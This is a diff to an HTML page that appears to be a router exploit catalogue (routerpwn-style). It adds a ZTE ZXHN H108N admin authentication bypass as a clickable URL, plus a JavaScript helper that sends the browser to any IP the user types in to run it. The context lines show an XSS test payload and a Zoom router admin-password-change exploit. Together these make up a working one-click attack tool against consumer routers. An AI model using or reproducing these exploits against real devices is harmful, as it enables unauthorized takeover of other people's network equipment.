@@ -166,6 +166,11 @@ function setip(url) {
 	if (ip==null || ip==""){}else{document.location="http://"+ip+url;}
 }
 
+function setipssl(url) {
+	ip=prompt("IP:");
+	if (ip==null || ip==""){}else{document.location="https://"+ip+url;}
+}
+
 function getxss() {
 	r=confirm("Use %3Cscript%3Ealert%281%29%3C%2fscript%3E ?");
 	if (r==true){
@@ -1868,6 +1873,7 @@ a=a+1
 			<div><h2><a href="#utstarcom">UTStarcom</a></h2></div>
 			<div><h2><a href="#xavi">Xavi</a></h2></div>
 			<div><h2><a href="#zyxel">ZyXEL</a></h2></div>
+			<div><h2><a href="#zte">ZTE</a></h2></div>
 			<div><h2><a href="#zoom">Zoom</a></h2></div>
 		</section><br><br><br><br>
 <section id="generadores">
@@ -3761,6 +3767,19 @@ a=a+1
 	<div><a href="http://www.exploit-db.com/exploits/26736/">[+]</a></div>
 	<div><a href="javascript:zoomX_changeadminpass()">X4 and X5 ADSL change administrator password</a></div>
 	<div><a href="javascript:zoomX_changeadminpass(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+<div style="float: right"><a href="#">^ Top</a></div>
+</section>
+
+<br><br><section id="zte">
+<h2>ZTE</h2>
+<h3><a href="javascript:img('ZXHN H108N ')">ZXHN H108N </a></h3>
+
+<article>
+	<div>01/15/14</div>
+	<div><a href="https://github.com/hkm/routerpwn.com/issues/1">[+]</a></div>
+	<div><a href="https://192.168.1.1/cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wancfg&obj-action=auth">ZTE ZXHN H108N Admin Authentication Bypass</a></div>
+	<div><a href="javascript:setipssl('cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wancfg&obj-action=auth')" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section>
